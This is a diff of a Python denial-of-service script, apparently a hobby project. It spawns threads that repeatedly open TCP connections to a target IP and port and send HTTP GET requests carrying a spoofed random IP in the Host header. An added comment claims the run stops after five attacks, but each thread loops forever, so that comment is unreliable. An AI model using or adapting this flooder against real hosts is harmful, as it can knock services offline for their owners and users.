@@ -20,8 +20,8 @@ attack_num = 0
 #modeled after NeuralNine and Tommaso Bona
 def ddos(VPN_IP, VPN_PORT):
 
-
-    # print("Starting simulated DOS attack. Please exit if you do not wish to continue")
+    # create fake ip address and set up server ip and port variables
+    print("Starting simulated DOS attack. Please exit if you do not wish to continue")
     fake_ip = str(socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff))))
     VPN_IP = str(VPN_IP)
     VPN_PORT = int(VPN_PORT)
@@ -29,20 +29,21 @@ def ddos(VPN_IP, VPN_PORT):
 
    
 
-
+    # perform ddos attack
     def attack():
         while True: 
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((VPN_IP, VPN_PORT))
-            s.sendto(("GET /" + VPN_IP + " HTTP/1.1\r\n").encode('ascii'), (VPN_IP, VPN_PORT))
+            s.sendto(("GET /" + VPN_IP + " HTTP/1.1\r\n").encode('ascii'), (VPN_IP, VPN_PORT)) 
             s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (VPN_IP, VPN_PORT))
             
             global attack_num
-            attack_num += 1
-            print(attack_num)
+            attack_num += 1 # visual for how many attack attemps
+            print("Attack Number: ", attack_num)
 
             s.close()
     
+    # to stop after certain amount of attacks (I set to 5 instead of 500 because I don't actually want to break anything)
     for _ in range(5):
         thread = threading.Thread(target=attack)
         thread.start()
